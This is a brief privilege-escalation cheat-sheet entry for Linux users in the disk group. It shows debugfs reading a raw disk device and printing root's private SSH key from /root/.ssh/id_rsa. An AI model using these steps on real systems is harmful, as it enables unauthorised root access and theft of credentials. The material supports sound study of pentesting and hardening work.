# Disk Group PrivEsc

The disk group gives the user full access to any block devices contained within /dev/. Since /dev/sda1 will in general be the global file-system, and the disk group will have full read-write privileges to this device:

```bash
# check list of disks mounted on the mnachine
 df -h

# debug file system
debugfs /dev/sda2 # if had the access, you should be able to execute command as root
debugfs:  cd /root/.ssh
debugfs:  cat id_rsa
```
